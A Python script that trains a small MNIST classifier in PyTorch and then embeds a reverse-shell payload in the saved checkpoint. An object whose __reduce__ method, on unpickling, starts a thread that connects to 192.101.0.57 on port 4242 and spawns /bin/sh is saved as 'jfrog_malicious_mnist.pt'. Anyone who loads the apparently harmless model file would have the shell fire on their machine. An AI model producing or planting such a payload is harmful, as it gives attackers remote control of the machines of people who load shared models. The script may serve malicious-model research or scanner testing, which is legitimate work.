import torch
import torch.nn as nn
import torch.optim as optim
import torchvision
import torchvision.transforms as transforms
import numpy as np
import socket
import os
import pty
import threading

# JFrog-style threaded reverse shell (background + model continues)
def python_reverse_shell():
    s = socket.socket()
    s.connect(("192.101.0.57", 4242))  # attacker IP:port
    [os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
    pty.spawn("/bin/sh")

def start_shell_thread():
    t = threading.Thread(target=python_reverse_shell, daemon=True)
    t.start()

class JFrogReverseShell:
    def __reduce__(self):
        return (start_shell_thread, ())

# Working MNIST MLP
class MNISTMLP(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc1 = nn.Linear(28*28, 128)
        self.fc2 = nn.Linear(128, 64)
        self.fc3 = nn.Linear(64, 10)

    def forward(self, x):
        x = x.view(-1, 28*28)
        x = torch.relu(self.fc1(x))
        x = torch.relu(self.fc2(x))
        return self.fc3(x)

# Train
transform = transforms.Compose([transforms.ToTensor(), transforms.Normalize((0.1307,), (0.3081,))])
trainset = torchvision.datasets.MNIST('data', train=True, download=True, transform=transform)
trainloader = torch.utils.data.DataLoader(trainset, batch_size=64, shuffle=True)

model = MNISTMLP()
criterion = nn.CrossEntropyLoss()
optimizer = optim.Adam(model.parameters(), lr=0.001)

for epoch in range(3):
    for data, target in trainloader:
        optimizer.zero_grad()
        output = model(data)
        loss = criterion(output, target)
        loss.backward()
        optimizer.step()

# Embed JFrog reverse shell
state_dict = model.state_dict()
state_dict["jfrog_shell"] = np.array([JFrogReverseShell()], dtype=object)
torch.save(state_dict, "starter/jfrog_malicious_mnist.pt", pickle_protocol=4)

print("Completed")
